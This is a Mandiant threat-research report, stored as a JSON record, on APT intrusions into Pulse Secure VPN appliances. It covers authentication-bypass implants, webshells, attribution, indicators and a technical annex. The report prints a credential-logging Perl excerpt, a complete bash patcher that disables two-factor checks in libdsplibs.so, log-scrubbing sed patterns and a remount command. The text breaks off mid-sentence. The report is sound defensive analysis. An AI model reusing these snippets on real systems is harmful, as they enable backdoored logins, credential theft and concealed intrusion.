{
    "id": "973bb435-da63-4a6f-8050-3ea464cdf5f7",
    "created_at": "2023-01-12T15:05:37.900553Z",
    "updated_at": "2025-03-27T02:15:25.639744Z",
    "deleted_at": null,
    "sha1_hash": "d0176a331fa0e89b22991370b3d56df1c799f93f",
    "title": "2021-04-20 - Check Your Pulse- Suspected APT Actors Leverage Authentication Bypass Techniques and Pulse Secure Zero-Day",
    "authors": "",
    "file_creation_date": "2022-05-28T17:32:12Z",
    "file_modification_date": "2022-05-28T17:32:12Z",
    "file_size": 178347,
    "plain_text": "# Check Your Pulse: Suspected APT Actors Leverage Authentication Bypass Techniques and Pulse Secure Zero-Day\n\n**fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-**\nday.html\n\nThreat Research\n\nDan Perez, Sarah Jones, Greg Wood, Stephen Eckels\n\nApr 20, 2021\n\n32 mins read\n\nTTPs\n\nThreat Research\n\n\n-----\n\nMalware\n\n**Executive Summary**\n\nMandiant recently responded to multiple security incidents involving compromises of\nPulse Secure VPN appliances.\nThis blog post examines multiple, related techniques for bypassing single and\nmultifactor authentication on Pulse Secure VPN devices, persisting across upgrades,\nand maintaining access through webshells.\nThe investigation by Pulse Secure has determined that a combination of prior\nvulnerabilities and a previously unknown vulnerability discovered in April 2021, CVE2021-22893, are responsible for the initial infection vector.\nPulse Secure’s parent company, Ivanti, released mitigations for a vulnerability exploited\n[in relation to these malware families and the Pulse Connect Secure Integrity Tool for](https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755)\ntheir customers to determine if their systems are impacted. A final patch to address the\nvulnerability will be available in early May 2021.\nPulse Secure has been working closely with Mandiant, affected customers, government\npartners, and other forensic experts to address these issues.\nThere is no indication the identified backdoors were introduced through a supply chain\ncompromise of the company’s network or software deployment process.\n\n**Introduction**\n\nMandiant is currently tracking 12 malware families associated with the exploitation of Pulse\nSecure VPN devices. These families are related to the circumvention of authentication and\nbackdoor access to these devices, but they are not necessarily related to each other and\nhave been observed in separate investigations. It is likely that multiple actors are responsible\nfor the creation and deployment of these various code families.\n\nThe focus of this report is on the activities of UNC2630 against U.S. Defense Industrial base\n(DIB) networks, but detailed malware analysis and detection methods for all samples\nobserved at U.S. and European victim organizations are provided in the technical annex to\nassist network defenders in identifying a large range of malicious activity on affected\nappliances. Analysis is ongoing to determine the extent of the activity.\n\nMandiant continues to collaborate with the Ivanti and Pulse Secure teams, Microsoft Threat\nIntelligence Center (MSTIC), and relevant government and law enforcement agencies to\ninvestigate the threat, as well as develop recommendations and mitigations for affected\nPulse Secure VPN appliance owners.\n\nAs part of their investigation, Ivanti has released mitigations for a vulnerability exploited in\n[relation to this campaign as well as the Pulse Connect Secure Integrity Tool to assist with](https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755)\ndetermining if systems have been impacted.\n\n**Details**\n\n\n-----\n\nEarly this year, Mandiant investigated multiple intrusions at defense, government, and\nfinancial organizations around the world. In each intrusion, the earliest evidence of attacker\nactivity traced back to DHCP IP address ranges belonging to Pulse Secure VPN appliances\nin the affected environment.\n\nIn many cases, we were not able to determine how actors obtained administrator-level\naccess to the appliances. However, based on analysis by Ivanti, we suspect some intrusions\nwere due to the exploitation of previously disclosed Pulse Secure vulnerabilities from 2019\n[and 2020 while other intrusions were due to the exploitation of CVE-2021-22893.](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784/)\n\nWe observed UNC2630 harvesting credentials from various Pulse Secure VPN login flows,\nwhich ultimately allowed the actor to use legitimate account credentials to move laterally into\nthe affected environments. In order to maintain persistence to the compromised networks,\nthe actor utilized legitimate, but modified, Pulse Secure binaries and scripts on the VPN\nappliance. This was done to accomplish the following:\n\n1. Trojanize shared objects with malicious code to log credentials and bypass\n\nauthentication flows, including multifactor authentication requirements. We track these\ntrojanized assemblies as SLOWPULSE and its variants.\n2. Inject webshells we currently track as RADIALPULSE and PULSECHECK into\n\nlegitimate Internet-accessible Pulse Secure VPN appliance administrative web pages\nfor the devices.\n3. Toggle the filesystem between Read-Only and Read-Write modes to allow for file\n\nmodification on a typically Read-Only filesystem.\n4. Maintain persistence across VPN appliance general upgrades that are performed by\n\nthe administrator.\n5. Unpatch modified files and delete utilities and scripts after use to evade detection.\n6. Clear relevant log files utilizing a utility tracked as THINBLOOD based on an actor\n\ndefined regular expression.\n\nIn a separate incident in March 2021, we observed UNC2717 using RADIALPULSE,\nPULSEJUMP, and HARDPULSE at a European organization. Although we did not observe\nPULSEJUMP or HARDPULSE used by UNC2630 against U.S. DIB companies, these\nmalware families have shared characteristics and serve similar purposes to other code\nfamilies used by UNC2630. We also observed an OpenSSL library file modified in similar\nfashion as the other trojanized shared objects. We believe that the modified library file, which\nwe’ve named LOCKPICK, could weaken encryption for communications used by the\nappliance, but do not have enough evidence to confirm this.\n\nDue to a lack of context and forensic evidence at this time, Mandiant cannot associate all the\ncode families described in this report to UNC2630 or UNC2717. We also note the possibility\nthat one or more related groups is responsible for the development and dissemination of\nthese different tools across loosely connected APT actors. It is likely that additional groups\n\n\n-----\n\nbeyond UNC2630 and UNC2717 have adopted one or more of these tools. Despite these\ngaps in our understanding, we included detailed analysis, detection techniques, and\nmitigations for all code families in the Technical Annex.\n\n**SLOWPULSE**\n\nDuring our investigation into the activities of UNC2630, we uncovered a novel malware\nfamily we labeled SLOWPULSE. This malware and its variants are applied as modifications\nto legitimate Pulse Secure files to bypass or log credentials in the authentication flows that\nexist within the legitimate Pulse Secure shared object libdsplibs.so. Three of the four\ndiscovered variants enable the attacker to bypass two-factor authentication. A brief overview\nof these variants is covered in this section, refer to the Technical Annex for more details.\n\nSLOWPULSE Variant 1\n\nThis variant is responsible for bypassing LDAP and RADIUS-2FA authentication routines if a\nsecret backdoor password is provided by the attacker. The sample inspects login credentials\nused at the start of each protocol’s associated routine and strategically forces execution\ndown the successful authentication patch if the provided password matches the attacker's\nchosen backdoor password.\n\n_LDAP Auth Bypass_\n\nThe routine DSAuth::LDAPAuthServer::authenticate begins the LDAP authentication\nprocedure. This variant inserts a check against the backdoor password after the bind routine\nso that the return value can be conditionally stomped to spoof successful authentication.\n\n\n-----\n\nLDAP Auth Bypass\n\n\nFigure 1: LDAP Auth Bypass\n_RADIUS Two Factor Auth Bypass_\n\nThe routine DSAuth::RadiusAuthServer::checkUsernamePassword begins the RADIUS-2FA\nauthentication procedure. This variant inserts checks against the backdoor password after\nthe RADIUS authentication packet is received back from the authentication server. If the\nbackdoor password is provided by the attacker, the packet type and successful\nauthentication status flags are overwritten to spoof successful authentication.\n\n\n-----\n\nRadius-2FA Bypass\n\n\nFigure 2: Radius-2FA Bypass\nSLOWPULSE Variant 2\n\n_ACE Two Factor Auth Credential Logging_\n\nThis variant logs credentials used during the ACE-2FA authentication procedure\nDSAuth::AceAuthServer::checkUsernamePassword. Rather than bypassing authentication,\nthis variant logs the username and password to a file for later use by the attacker.\n\n\n-----\n\nACE Auth Credential Log\n\n\nFigure 3: ACE Auth Credential Log\nSLOWPULSE Variant 3\n\n_ACE Two Factor Auth Bypass_\n\nThis variant is responsible for bypassing the ACE-2FA logon procedure starting with\nDSAuth::AceAuthServer::checkUsernamePassword. The flow of the authentication\nprocedure is modified to bypass the routine responsible for verifying the username and\npassword if the backdoor password is provided. With this modification the attacker can spoof\nsuccessful authentication.\n\n\n-----\n\nACE Auth Bypass Variant\n\n\nFigure 4: ACE Auth Bypass Variant\nSLOWPULSE Variant 4\n\n_RealmSignin Two Factor Auth Bypass_\n\nThis variant bypasses the RealmSignin::runSecondaryAuth procedure of the Pulse Secure\nVPN. The inserted logic modifies the execution flow of a specific step of the login process to\nspoof successful authentication. We believe that this may be a two-factor authentication\nbypass.\n\n\n-----\n\nRealmSignIn 2FA Auth Bypass\n\n\nFigure 5: RealmSignIn 2FA Auth Bypass\n\n**Attribution**\n\nWe are in the early stages of gathering evidence and making attribution assessments and\nthere are a number of gaps in our understanding of UNC2630, UNC2717, and these 12 code\nfamilies. Nevertheless, the Mandiant and Ivanti teams are proactively releasing this analysis\nto assist network defenders in triaging and identifying malicious activity on affected\nappliances.\n\nMandiant is able to assess that:\n\n\n-----\n\nUNC2630 targeted U.S. DIB companies with SLOWPULSE, RADIALPULSE,\nTHINBLOOD, ATRIUM, PACEMAKER, SLIGHTPULSE, and PULSECHECK as early\nas August 2020 until March 2021.\n\nWe suspect UNC2630 operates on behalf of the Chinese government and may\nhave ties to APT5\nUNC2717 targeted global government agencies between October 2020 and March\n2021 using HARDPULSE, QUIETPULSE, AND PULSEJUMP.\n\nWe do not have enough evidence about UNC2717 to determine government\nsponsorship or suspected affiliation with any known APT group.\nWe do not have enough information about the use of LOCKPICK to make an attribution\nstatement.\n\nUNC2630\n\nUNC2630’s combination of infrastructure, tools, and on-network behavior appear to be\nunique, and we have not observed them during any other campaigns or at any other\nengagement. Despite these new tools and infrastructure, Mandiant analysts noted strong\nsimilarities to historic intrusions dating back to 2014 and 2015 and conducted by Chinese\nespionage actor APT5. We have also uncovered limited evidence to suggest that UNC2630\noperates on behalf of the Chinese government. Analysis is still ongoing to determine the full\nscope of the activity that maybe related to the group.\n\nAlthough we are not able to definitively connect UNC2630 to APT5, or any other existing\nAPT group, a trusted third party has uncovered evidence connecting this activity to historic\ncampaigns which Mandiant tracks as Chinese espionage actor APT5. While we cannot make\nthe same connections, the third party assessment is consistent with our understanding of\nAPT5 and their historic TTPs and targets.\n\nAPT5 has shown significant interest in compromising networking devices and manipulating\nthe underlying software which supports these appliances. They have also consistently\ntargeted defense and technology companies in the U.S., Europe, and Asia.\n\nAs early as 2014, Mandiant Incident Response discovered APT5 making unauthorized\ncode modifications to files in the embedded operating system of another technology\nplatform.\nIn 2015, APT5 compromised a U.S. telecommunications organization providing\nservices and technologies for private and government entities. During this intrusion, the\nactors downloaded and modified some of the router images related to the company’s\nnetwork routers.\nAlso during this time, APT5 stole files related to military technology from a South Asian\ndefense organization. Observed filenames suggest the actors were interested in\nproduct specifications, emails concerning technical products, procurement bids and\nproposals, and documents on unmanned aerial vehicles (UAVs).\n\n\n-----\n\nAPT5 persistently targets high value corporate networks and often re-compromises\nnetworks over many years. Their primary targets appear to be aerospace and defense\ncompanies located in the U.S., Europe, and Asia. Secondary targets (used to facilitate\naccess to their primary targets) include network appliance manufacturers and software\ncompanies usually located in the U.S.\n\n**Recommendations**\n\nAll Pulse Secure Connect customers should assess the impact of the Pulse Secure\nmitigations and apply it if possible. Organizations should utilize the most recent version of\n[Pulse Secure’s Integrity Assurance utility released on March 31, 2021. If a device fails this](https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755)\n[Integrity Assurance utility, network administrators should follow the instructions here and](https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755)\ncontact their Pulse CSR for additional guidance.\n\nOrganizations should examine available forensic evidence to determine if an attacker\ncompromised user credentials. Ivanti highly recommends resetting all passwords in the\nenvironment and reviewing the configuration to ensure no service accounts can be used to\nauthenticate to the vulnerability.\n\nAdditional detections, mitigations and relevant MITRE ATT&CK techniques are included in\nthe Technical Annex. Sample hashes and analysis are included to enable defenders to\nquickly assess if their respective appliances have been affected. Yara rules, Snort rules, and\n[hashes are published on Mandiant’s GitHub page.](https://github.com/mandiant/pulsesecure_exploitation_countermeasures/)\n\n**Detections and Mitigations**\n\n1d3ab04e21cfd40aa8d4300a359a09e3b520d39b1496be1e4bc91ae1f6730ecc\n\nHARDPULSE contains an embedded 'recovery' URL https://ive-host/danana/auth/recover[.]cgi?token=<varies> that may be accessed by an attacker. The\nsample uses the POST parameters checkcode, hashid, m, and filename. This URL is\nnot present in legitimate versions of this file.\n\n7fa71a7f76ef63465cfeacf58217e0b66fc71bc81d37c44380a6f572b8a3ec7a\n\n68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2\n\nd72daafedf41d484f7f9816f7f076a9249a6808f1899649b7daa22c0447bb37b\n\nPULSEJUMP, RADIALPULSE AND PACEMAKER use the following files to record\ncredentials:\n\n/tmp/dsactiveuser.statementcounters\n/tmp/dsstartssh.statementcounters\n/tmp/dsserver-check.statementcounters\n\ncd09ec795a8f4b6ced003500a44d810f49943514e2f92c81ab96c33e1c0fbd68\n\n\n-----\n\nThe malicious operations of SLOWPULSE can be detected via log correlation between\nthe authentication servers responsible for LDAP and RADIUS auth and the VPN server.\nAuthentication failures in either LDAP or RADIUS logs with the associated VPN logins\nshowing success would be an anomalous event worthy of flagging.\n\na1dcdf62aafc36dd8cf64774dea80d79fb4e24ba2a82adf4d944d9186acd1cc1\n\nUpon invocation of the PULSECHECK webshell, the following HTTP request headers\nwill be sent:\n\n**Key** **Value**\n\nREQUEST_METHOD POST\n\nHTTP_X_KEY <BackdoorKey>\n\nHTTP_X_CNT <RC4Key>\n\nHTTP_X_CMD <RC4Command>\n\n1ab50b77dd9515f6cd9ed07d1d3176ba4627a292dc4a21b16ac9d211353818bd\n\nSLOWPULSE VARIANT 2 writes ACE logon credentials to the\nfile /home/perl/PAUS.pm in a+ (append) mode, using the format string %s:%s\\n.\n\n68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2\n\nPACEMAKER is saved at filepath /home/bin/memread\nExecuted with commandline flags –t, -m, -s\nAttaches to victim processes with PTRACE and opens subfiles in /proc/\n\n88170125598a4fb801102ad56494a773895059ac8550a983fdd2ef429653f079\n\nTHINBLOOD creates the files:\n\n/home/runtime/logs/log.events.vc1\n/home/runtime/logs/log.events.vc2\n/home/runtime/logs/log.access.vc1\n/home/runtime/logs/log.access.vc2\nExecutes the system API with the mv command specifying one of the files above,\ntargeting:\n\n/home/runtime/logs/log.access.vc0\n/home/runtime/logs/log.events.vc0\n\n\n-----\n\nExecutes the rm command specify one of the .vc1 files above\n\n133631957d41eed9496ac2774793283ce26f8772de226e7f520d26667b51481a\n\nSLIGHTPULSE uses /tmp/1 as command execution log\nAll POST requests to meeting_testjs.cgi are suspicious\nPOST parameters: cert, img, name are used by malicious logic\nResponses to the endpoint with the name parameter respond with no-cache and\nimage/gif\n\n1741dc0a491fcc8d078220ac9628152668d3370b92a8eae258e34ba28c6473b9\n\nTHINBLOOD execution of sed on the files:\n\nlog.events.vc0\nlog.access.vc0\nLog.admin.vc0\nSed patterns used:\n\ns/.\\x00[^\\x00]*<regex_string>[^\\x00]*\\x09.\\x00//g\ns/\\x<hex_char>\\x00[^\\x00]*<regex_string>[^\\x00]*\\x09\\x<hex_char>\\x00//g\n\n06c56bd272b19bf7d7207443693cd1fc774408c4ca56744577b11fee550c23f7\n\nThe sample accepts an input and output file as its first and second arguments, then\nwrites a patched version of the input out. The commandline argument e or E must be\nsupplied as the fourth argument. Example command line:\n\n./patcher input.bin output.bin backdoorkey e\n\nf2b1bd703c3eb05541ff84ec375573cbdc70309ccb82aac04b72db205d718e90\n\nThe sample uses the HTTP query parameter id and responds with HTTP headers\n\"Cache-Control: no-cache\\n\" and \"Content-type: text/html\\n\\n\".\n\n224b7c45cf6fe4547d3ea66a12c30f3cb4c601b0a80744154697094e73dbd450\n\n64c87520565165ac95b74d6450b3ab8379544933dd3e2f2c4dc9b03a3ec570a7\n\n78d7c7c9f800f6824f63a99d935a4ad0112f97953d8c100deb29dae24d7da282\n\n705cda7d1ace8f4adeec5502aa311620b8d6c64046a1aed2ae833e2f2835154f\n\nExecute sed on PulseSecure system files\nRemounts filesystem as writable: system(\"/bin/mount -o remount,rw /dev/root /\")\nUnexpected execution of other system commands such as tar, cp, rm\n\n**MITRE ATT&CK Techniques**\n\n\n-----\n\nThe following list of MITRE ATT&CK techniques cover all malware samples described in this\nreport as well as those observed throughout the lifecycle of UNC2630 and UNC2717.\n\nT1003-OS Credential Dumping\nT1016-System Network Configuration Discovery\nT1021.001-Remote Desktop Protocol\nT1027-Obfuscated Files or Information\nT1036.005-Match Legitimate Name or Location\nT1048-Exfiltration Over Alternative Protocol\nT1049-System Network Connections Discovery\nT1053-Scheduled Task/Job\nT1057-Process Discovery\nT1059-Command and Scripting Interpreter\nT1059.003-Windows Command Shell\nT1070-Indicator Removal on Host\nT1070.001-Clear Windows Event Logs\nT1070.004-File Deletion\nT1071.001-Web Protocols\nT1082-System Information Discovery\nT1098-Account Manipulation\nT1105-Ingress Tool Transfer\nT1111-Two-Factor Authentication Interception\nT1133-External Remote Services\nT1134.001 Access Token Manipulation: Token Impersonation/Theft\nT1136-Create Account\nT1140-Deobfuscate/Decode Files or Information\nT1190-Exploit Public-Facing Application\nT1505.003-Web Shell\nT1518-Software Discovery\nT1554-Compromise Client Software Binary\nT1556.004-Network Device Authentication\nT1592.004 Gather Victim Host Information: Client Configurations\nT1562 Impair Defenses\nT1569.002-Service Execution\nT1574 Hijack Execution Flow\nT1600-Weaken Encryption\n\n\n-----\n\nMITRE ATT&CK Map\n\n\nFigure 6: MITRE ATT&CK Map\n\n**Technical Annex**\n\nSLIGHTPULSE\n\nThe file meeting_testjs.cgi (SHA256:\n133631957d41eed9496ac2774793283ce26f8772de226e7f520d26667b51481a) is a\nwebshell capable of arbitrary file read, write, and command execution. Malicious logic is\ninserted at the end of legitimate logic to respond to POST requests. We believe this webshell\nmay be responsible for placing additional webshells and used to modify legitimate system\ncomponents resulting in the other observed malware families due to its functionality.\n\nThe malicious logic inserts a branch condition to respond to HTTP POST requests rather\nthan just the typical GET requests expected of the legitimate code. If GET requests are\nperformed the legitimate logic is still invoked. POST requests have a series of parameters\n\n\n-----\n\nchecked for existence to determine which command to invoke. This logic is:\n\n**POST params** **Invoked Command**\n\ncert writefile\n\nimg, name with nonempty value readfile\n\nimg set to empty string \"\", name execcmd\n\nanything else invoke original legitimate logic\n\n\n-----\n\nWebshells respond to POSTs\n\n\nFigure 7: Webshells respond to POSTs\nAll incoming and outgoing requests are base64 encoded/decoded and RC4\nencrypted/decrypted. The scheme is simple. The first six characters of the data are a random\nkey generated per request as a sort of nonce, with the static RC4 key appended. This nonce\n+ phrase together act as the RC4 key. The phrase is not sent over the wire, only the nonce.\nThis entire key is then used to encrypt/decrypt payload data that immediately follows the key.\nThe form of data on the wire is:\n\nOutbound/Inbound:\n\n<6randbytes><encrypted_data>\n^-RC4NONCE-^\n\nUsage:\n\n\n-----\n\n<6randbytes><rc4_phrase><encrypted_data>\n^-------RC4 KEY--------^\n\n_ReadFile_\n\nThis command accepts a base64 encoded, RC4 encrypted file name via the img parameter\nand opens it for read. The file contents are read in full then sent back to the attacker as\nbase64 encoded, RC4 encrypted data with the headers \"Content-type: application/xdownload\\n\", and form header \"Content-Disposition: attachment; filename=tmp\\n\\n\".\n\n_WriteFile_\n\nThis command accepts a base64 encoded, RC4 encrypted filename via the cert parameter,\nand base64 encoded, RC4 encrypted file data via the parameter md5. The filename is\nopened in write mode with the file data being written to the file before the file is closed. The\nresults of this command are sent back to the attacker, using the headers \"Cache-Control: nocache\\n\" and \"Content-type: text/html\\n\\n\".\n\n_Execute_\n\nThis command accepts a base64 encoded, RC4 encrypted commands via the name\nparameter. The malicious logic forbids the cd command and will respond with the text Error\n404 if executed. All other commands will be executed via the system API with output piped to\nthe file /tmp/1. The full system command is <command> >/tmp/1 2>&1. The output of this\nexecution is read and sent back to the attacker base64 encoded, RC4 encrypted. The\nheaders \"Cache-Control: no-cache\\n\" and \"Content-type: image/gif\\n\\n\" are used. The\nresponse appears to be masquerading as a GIF when sending back this command output.\n\nRADIALPULSE\n\nThe file with the SHA256 hash\nd72daafedf41d484f7f9816f7f076a9249a6808f1899649b7daa22c0447bb37b is a modified\nPerl script associated with a PulseSecure web-based tool which causes usernames,\npasswords and information associated with logins to this application to be written to the file\n/tmp/dsstartssh.statementcounters.\n\nRetrieval of these login credentials must be achieved through other means such as an\ninteractive login or a webshell. Persistence is achieved by the addition of compromised code\nwhich is continually served when requesting this PulseSecure webpage.\n\nAn excerpt of the code related to credential stealing is shown as follows:\n\nmy $realmName1 = $signin->getRealmInfo()->{name};\n\nopen(*fd, \">>/tmp/dsstartssh.statementcounters\");\n\nsyswrite(*fd \"realm=$realmName1 \" 5000);\n\n\n-----\n\nsyswrite( fd, username=$username, 5000);\n\nsyswrite(*fd, \"password=$password\\n\", 5000);\n\nclose(*fd);\n\nSLOWPULSE Variant 1\n\nThe file libdsplibs.so with SHA256\ncd09ec795a8f4b6ced003500a44d810f49943514e2f92c81ab96c33e1c0fbd68 is a trojanized\nELF shared object belonging to the PulseSecure VPN server. The sample has been modified\nto bypass specific authentication mechanisms of the LDAP and RADIUS protocols. The\nsample hardcodes a backdoor key that will silently subvert auth failures if the correct\nbackdoor key is passed, establishing a VPN connection as if auth succeeded. If the\nbackdoor password is not used, authentication will fail as normal.\n\nIn multiple locations assembly is written into the padding regions between legitimate\nfunctions. As these regions are very small, around 20 bytes, the malicious logic stitches itself\ntogether by unconditionally jumping between multiple padding regions. The assembly is\nwritten in a way very similar to mid-function hooks, where it is common to push and then pop\nall flags and registers before and after the injected logic. By preserving registers and flags in\nthis way the malicious logic is able to execute and perform its malicious logic as a passive\nobserver if desired, only effecting the control flow in specific conditions. This is employed in\ntwo locations, the LDAP and RADIUS authentication routines,\nDSAuth::LDAPAuthServer::authenticate and\nDSAuth::RadiusAuthServer::checkUsernamePassword respectively.\n\n_LDAP Auth Bypass_\n\nIn the typical execution of DSAuth::LDAPAuthServer::authenticate the legitimate application\nconstructs the C++ object DSAuth::LDAPAuthServer::ldap then passes it to\nDSLdapServer::bind with the username and password for login. This bind may fail or\nsucceed which determines the authentication failure or success of the LDAP protocol. The\nmalicious logic inserted into the application redirects execution before DSLdapServer::bind\njust after the ldap object is constructed. At this point in execution the username and\npassword are easily extracted from memory with mid-function hooking techniques, which the\nsample copies to a code cave in memory between two functions as a temporary storage\nlocation. The malicious logic then invokes DSLdapServer::bind as the normal logic would,\nwhich sets the return register EAX to 0 or 1 for failure or success. A check is then executed\nwhere the temporary password copy made earlier is checked against a hardcoded backdoor\npassword. If this check passes the backdoor logic actives by overwriting EAX to 1 to force\nthe application down the execution path of successful authentication, even though in reality\nauthentication failed.\n\nRADIUS Two Factor Auth Bypass\n\n\n-----\n\nIn the typical execution of DSAuth::RadiusAuthServer::checkUsernamePassword the\nlegitimate application sends a RADIUS-2FA auth packet with username and password via\nRadiusAuthPacket::sendRadiusPacket. The response is then retrieved and parsed by the\nroutine DSAuth::RadiusAuthServer::handleResponse. After packet retrieval the packet type\nis verified to be 3, it's not known what this packet type specifies but this is the packet type of\na successful authentication response. If the packet type check passes, then the sample\nreads a field of the packet that specifies if authentication was successful or not and then\nchecks this status later. The inserted malicious logic hijacks execution just after\nDSAuth::RadiusAuthServer::handleResponse where the password sent to the RADIUS\nserver is checked against a backdoor password. If this check passes the malicious logic\noverwrites the retrieved packet with values indicating that it's of type 3 and that\nauthentication was successful. The malicious logic then rejoins the original execution flow\nwhere the packet type is checked. If written the spoofed values force the application down\nthe execution path of successful authentication, even though in reality authentication failed.\n\nSLOWPULSE Variant 2\n\n_ACE Two Factor Auth Credential Logging_\n\nWe also identified a variant of SLOWPULSE (SHA256:\n1ab50b77dd9515f6cd9ed07d1d3176ba4627a292dc4a21b16ac9d211353818bd) which logs\ncredentials used during ACE-2FA protocol authentication.\n\nThe backdoor is implemented in the routine\nDSAuth::AceAuthServer::checkUsernamePassword. As part of the login procedure the\nusername and password are retrieved then written into a map entry structure. The backdoor\ninserts an unconditional jump into the logon logic that takes this map entry structure, reads\nthe username and password fields, then writes them to the file /home/perl/PAUS.pm in a+\n(append) mode, using the format string %s:%s\\n. The backdoor then unconditionally jumps\nback into the normal control flow to continue the logon process as normal.\n\nSLOWPULSE Variant 3\n\n_ACE Two Factor Auth Bypass_\n\nWe Identified another variant of SLOWPULSE (SHA256:\nb1c2368773259fbfef425e0bb716be958faa7e74b3282138059f511011d3afd9) which is similar\nto SLOWPULSE VARIANT 2 the malicious logic lives within\nDSAuth::AceAuthServer::checkUsernamePassword, however this variant bypasses the\nlogon procedure rather than login credentials. Typical execution of this routine calls\nDsSecID_checkLogin to validate the username and password which sets the EAX register to\n1. The routine DSAuth::AceAuthServer::handleACEAuthResult then checks EAX to\ndetermine if auth was successful or not. The malicious logic hijacks execution immediately\nafter the username and password fields are written to their map entries, then checks if the\npassword matches the backdoor password. If the password matches, then the EAX register\nis overwritten to 1 This puts the program in the same state as if DsSecID checkLogin had\n\n\n-----\n\nsuccessfully executed, but unlike SLOWPULSE VARIANT 1 the original authentication\nroutine is not called at all. The malicious logic then rejoins execution before\nDSAuth::AceAuthServer::handleACEAuthResult which will now pass. This forces the\napplication down the execution path of successful authentication, even though in reality\nauthentication would have failed.\n\nSLOWPULSE Variant 4\n\n_RealmSignin Two Factor Auth Bypass_\n\nWe identified a fourth variant of SLOWPULSE responsible for bypassing what may be the\ntwo-factor authentication step of the DSAuth::RealmSignin process. The backdoor is present\nwithin the function DSAuth::RealmSignin::runSigninStep.This routine is responsible for\nmultiple steps of the login procedure and is implemented as a large switch statement. Case\n11 of the switch statement typically calls the routines DSMap::setPrivacyKeyNames then\nDSAuth::RealmSignin::runSecondaryAuth. The malicious logic in this variant overwrites the\ncall to DSAuth::RealmSignin::runSecondaryAuth with mov eax, 1. This forces application\nflow as if DSAuth::RealmSignin::runSecondaryAuth always succeeds, without ever calling it.\nWe were not able to recover a file with these patches applied as the attacker removed their\npatches after use. However, we did uncover both the patcher and unpatcher utilities. We do\nnot provide a hash for this file as we have not recovered it from a system in the field. This\nanalysis was performed by replaying the changes performed by the patcher we did recover.\n\nSLOWPULSE Variant 2 Patcher\n\nAs part of our investigation into the SLOWPULSE family we were able to recover the utility\nused by the attacker to insert the malicious logic into the original libdsplibs.so file. The file\nwith SHA256: c9b323b9747659eac25cec078895d75f016e26a8b5858567c7fb945b7321722c\nis responsible for inserting SLOWPULSE V2 malicious logic to log ACE credentials. The\npatcher accepts two command line arguments, the path to the original binary and the\npatched output file path. The original binary is read into memory, patched, and then written to\nthe output path. The assembly patches and offsets into the original binary are hardcoded.\n\nSLOWPULSE Variant 3 Patcher\n\nAs part of our investigation into the SLOWPULSE family we were able to recover the utility\nused by the attacker to insert the malicious logic into the original libdsplibs.so file. The file\nwith SHA256: 06c56bd272b19bf7d7207443693cd1fc774408c4ca56744577b11fee550c23f7\nis responsible for inserting SLOWPULSE V3 malicious logic to bypass ACE logon\nauthentication process. The patcher accepts four arguments. The first argument is the\noriginal binary path, the second the patched output file path, third is the backdoor bypass\npassword, and fourth is the letter e specifying to apply patches. The sample reads the\noriginal binary into memory, applies the assembly patches associated with SLOWPULSE V3,\nas well as the provided bypass password, then written to the output path. The assembly\npatches, and all offsets including where to copy the bypass password are hardcoded.\n\nSLOWPULSE Variant 4 Patcher\n\n\n-----\n\nAs part of our investigation into the SLOWPULSE family we recovered the utility the attacker\nused to insert the malicious logic into the original libdsplibs.so file. The file with SHA256:\ne63ab6f82c711e4ecc8f5b36046eb7ea216f41eb90158165b82a6c90560ea415 responsible\nfor inserting the patch for SLOWPULSE V3. The patch applied overwrites a single call to\nDSAuth::RealmSignin::runSecondaryAuth with mov eax, 1. This patcher utility is a simple\nbash script, unlike the previous patchers which were compiled applications likely written in C.\nThe script in full is:\n\nprintf '\\xB8' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B31))\nprintf '\\x01' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B32))\nprintf '\\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B33))\nprintf '\\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B34))\nprintf '\\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B35))\n\nSLOWPULSE Variant 4 UnPatcher\n\nAs part of our investigation into the SLOWPULSE family we were able to recover the utility\nused by the attacker to remove the malicious logic into the original libdsplibs.so file for\nSLOWPULSE V4. The attacker chose to remove the patches applied to libdsplibs.so. The file\nwith SHA256: b2350954b9484ae4eac42b95fae6edf7a126169d0b93d79f49d36c5e6497062a\nis the unpatcher utility for SLOWPULSE V4. This sample is also a simple bash script, in full it\nis:\n\nprintf '\\xE8' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B31))\nprintf '\\xE2' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B32))\nprintf '\\x08' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B33))\nprintf '\\xD0' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B34))\nprintf '\\xFF' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B35))\n\nSTEADYPULSE\n\nThe file licenseserverproto.cgi (SHA256:\n168976797d5af7071df257e91fcc31ce1d6e59c72ca9e2f50c8b5b3177ad83cc) is a webshell\nimplemented via modification of a legitimate Perl script used by a Pulse Secure tool which\nenables arbitrary command execution.\n\nThe attacker inserted two blocks of Perl code that implement the webshell. The source code\nmodifications are surrounded by comments that indicate the start and end of inserted code.\nThe comment strings used are ##cgistart1, ##cgiend1, ##cgistart2 and ##cgiend2. Although\nthe exact purpose of these comment strings is unknown, the attacker may use them to\nfacilitate updates to the malicious code or to allow for its quick removal if necessary.\n\nThe Perl script enclosed in the tags ##cgistart1 and ##cgiend1 adds several lines to\nimport Perl modules that are used by the webshell. It also adds a function to parse\nparameters of received command data.\n\n\n-----\n\nThe script enclosed in the tags ##cgistart2 and ##cgiend2 is responsible for checking\nweb requests designed to be executed by the webshell, if present. If no webshell\nrequest is found, the script passes execution to the legitimate Perl script for the\nwebpage.\n\nThe webshell portion of the script is 